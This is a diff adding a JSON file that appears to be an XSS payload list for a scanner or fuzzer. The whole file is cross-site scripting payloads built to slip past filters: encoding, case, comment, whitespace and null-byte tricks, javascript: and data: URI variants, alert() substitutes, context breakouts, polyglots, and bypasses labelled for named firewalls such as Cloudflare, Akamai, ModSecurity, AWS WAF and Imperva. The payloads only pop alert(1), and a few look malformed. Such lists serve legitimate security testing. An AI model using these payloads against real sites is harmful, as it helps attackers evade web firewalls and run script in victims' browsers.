@@ -1,0 +1,162 @@
+{
+  "encoding_bypasses": {
+    "html_entities": [
+      {"original": "<", "bypass": "&lt;", "context": "html"},
+      {"original": ">", "bypass": "&gt;", "context": "html"},
+      {"original": "\"", "bypass": "&quot;", "context": "attribute"},
+      {"original": "'", "bypass": "&#39;", "context": "attribute"},
+      {"original": "/", "bypass": "&#47;", "context": "all"},
+      {"original": "javascript", "bypass": "&#x6A;avascript", "context": "href"},
+      {"original": "javascript", "bypass": "java&#x0D;script", "context": "href"},
+      {"original": "javascript", "bypass": "java&#x09;script", "context": "href"},
+      {"original": "javascript", "bypass": "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;", "context": "href"}
+    ],
+    "url_encoding": [
+      {"original": "<", "bypass": "%3C"},
+      {"original": ">", "bypass": "%3E"},
+      {"original": "\"", "bypass": "%22"},
+      {"original": "'", "bypass": "%27"},
+      {"original": "(", "bypass": "%28"},
+      {"original": ")", "bypass": "%29"},
+      {"original": "/", "bypass": "%2F"}
+    ],
+    "double_encoding": [
+      {"original": "<", "bypass": "%253C"},
+      {"original": ">", "bypass": "%253E"},
+      {"original": "\"", "bypass": "%2522"},
+      {"original": "'", "bypass": "%2527"}
+    ],
+    "unicode": [
+      {"original": "<", "bypass": "\\u003c", "context": "javascript"},
+      {"original": ">", "bypass": "\\u003e", "context": "javascript"},
+      {"original": "'", "bypass": "\\u0027", "context": "javascript"},
+      {"original": "\"", "bypass": "\\u0022", "context": "javascript"}
+    ]
+  },
+  "case_bypasses": {
+    "tags": ["<ScRiPt>", "<SCRIPT>", "<sCrIpT>", "<ScRIPt>"],
+    "events": ["oNeRrOr", "ONERROR", "OnErRoR", "onerror"],
+    "javascript": ["JavaScript", "JAVASCRIPT", "jAvAsCrIpT", "javascript"]
+  },
+  "comment_bypasses": [
+    {"payload": "<scr<!--comment-->ipt>alert(1)</script>", "description": "HTML comment inside tag"},
+    {"payload": "<script>al/**/ert(1)</script>", "description": "JS comment in function"},
+    {"payload": "<img src=x onerror=aler/**/t(1)>", "description": "Comment in event handler"}
+  ],
+  "whitespace_bypasses": [
+    {"payload": "<img/src=x/onerror=alert(1)>", "description": "Slash instead of space"},
+    {"payload": "<img%0asrc=x%0aonerror=alert(1)>", "description": "Newline encoded"},
+    {"payload": "<img%09src=x%09onerror=alert(1)>", "description": "Tab encoded"},
+    {"payload": "<img%0dsrc=x%0donerror=alert(1)>", "description": "Carriage return"},
+    {"payload": "<svg/onload=alert(1)>", "description": "Slash separator"}
+  ],
+  "null_byte_bypasses": [
+    {"payload": "<scri%00pt>alert(1)</script>", "description": "Null byte in tag"},
+    {"payload": "<script>alert%00(1)</script>", "description": "Null byte in payload"}
+  ],
+  "protocol_bypasses": {
+    "javascript_variants": [
+      "javascript:",
+      "JaVaScRiPt:",
+      "javascript&colon;",
+      "java\tscript:",
+      "java\nscript:",
+      "java\rscript:",
+      "&#x6A;avascript:",
+      "&#106;avascript:",
+      "javascript&#58;",
+      "javascript&#x3A;",
+      "data:text/html,<script>alert(1)</script>",
+      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+    ]
+  },
+  "function_bypasses": {
+    "alert_alternatives": [
+      {"payload": "alert(1)", "bypass": "alert`1`", "description": "Template literal"},
+      {"payload": "alert(1)", "bypass": "prompt(1)", "description": "Prompt function"},
+      {"payload": "alert(1)", "bypass": "confirm(1)", "description": "Confirm function"},
+      {"payload": "alert(1)", "bypass": "console.log(1)", "description": "Console log"},
+      {"payload": "alert(1)", "bypass": "eval('ale'+'rt(1)')", "description": "String concat eval"},
+      {"payload": "alert(1)", "bypass": "window['alert'](1)", "description": "Bracket notation"},
+      {"payload": "alert(1)", "bypass": "this['alert'](1)", "description": "This bracket notation"},
+      {"payload": "alert(1)", "bypass": "top['alert'](1)", "description": "Top bracket notation"},
+      {"payload": "alert(1)", "bypass": "self['alert'](1)", "description": "Self bracket notation"},
+      {"payload": "alert(1)", "bypass": "[].constructor.constructor('alert(1)')()", "description": "Constructor"},
+      {"payload": "alert(1)", "bypass": "(function(){alert(1)})()", "description": "IIFE"},
+      {"payload": "alert(1)", "bypass": "setTimeout('alert(1)')", "description": "setTimeout"},
+      {"payload": "alert(1)", "bypass": "setInterval('alert(1)')", "description": "setInterval"},
+      {"payload": "alert(1)", "bypass": "Function('alert(1)')()", "description": "Function constructor"},
+      {"payload": "alert(1)", "bypass": "new Function('alert(1)')()", "description": "New Function"},
+      {"payload": "alert(1)", "bypass": "eval.call(null,'alert(1)')", "description": "Eval call"},
+      {"payload": "alert(1)", "bypass": "Reflect.apply(alert,null,[1])", "description": "Reflect.apply"}
+    ]
+  },
+  "waf_specific": {
+    "cloudflare": [
+      {"payload": "<svg/onload=alert(1)>", "note": "No space between tag and event"},
+      {"payload": "<img src=x onerror=alert`1`>", "note": "Template literal"},
+      {"payload": "<details/open/ontoggle=alert(1)>", "note": "Slashes as separators"}
+    ],
+    "akamai": [
+      {"payload": "<img src=x onerror=\\u0061lert(1)>", "note": "Unicode escape"},
+      {"payload": "<svg onload=&#97;lert(1)>", "note": "HTML entity"}
+    ],
+    "modsecurity": [
+      {"payload": "<img src=x onerror=a]lert(1)>", "note": "Extra characters"},
+      {"payload": "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>", "note": "Complex bypass"}
+    ],
+    "aws_waf": [
+      {"payload": "<img src=x onerror=\\x61lert(1)>", "note": "Hex escape"},
+      {"payload": "{{constructor.constructor('alert(1)')()}}", "note": "Template injection"}
+    ],
+    "imperva": [
+      {"payload": "<img src=x onerror=al\\u0065rt(1)>", "note": "Partial unicode"},
+      {"payload": "<svg onload=alert&lpar;1&rpar;>", "note": "HTML entities for parens"}
+    ]
+  },
+  "context_specific": {
+    "attribute_breakout": [
+      "\"><img src=x onerror=alert(1)>",
+      "'><img src=x onerror=alert(1)>",
+      "\" onmouseover=alert(1) x=\"",
+      "' onmouseover=alert(1) x='",
+      "\" onfocus=alert(1) autofocus x=\"",
+      "javascript:alert(1)//",
+      "\" onclick=alert(1) //"
+    ],
+    "javascript_string_breakout": [
+      "';alert(1)//",
+      "\";alert(1)//",
+      "</script><script>alert(1)</script>",
+      "\\';alert(1)//",
+      "'-alert(1)-'",
+      "'+alert(1)+'",
+      "\\x3c/script\\x3e\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
+    ],
+    "template_literal_breakout": [
+      "${alert(1)}",
+      "`-alert(1)-`",
+      "${`${alert(1)}`}"
+    ],
+    "html_comment_breakout": [
+      "--><img src=x onerror=alert(1)>",
+      "--!><img src=x onerror=alert(1)>"
+    ],
+    "style_breakout": [
+      "</style><img src=x onerror=alert(1)>",
+      "expression(alert(1))",
+      "url(javascript:alert(1))"
+    ]
+  },
+  "polyglots": [
+    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
+    "\"><svg/onload='/**/alert(1)'//",
+    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+    "-->'\"--></style></script><svg/onload=alert(1)>",
+    "'\"><img src=x onerror=alert(1)>",
+    "{{constructor.constructor('alert(1)')()}}",
+    "<%=alert(1)%>",
+    "#{alert(1)}",
+    "${alert(1)}"
+  ]
+}
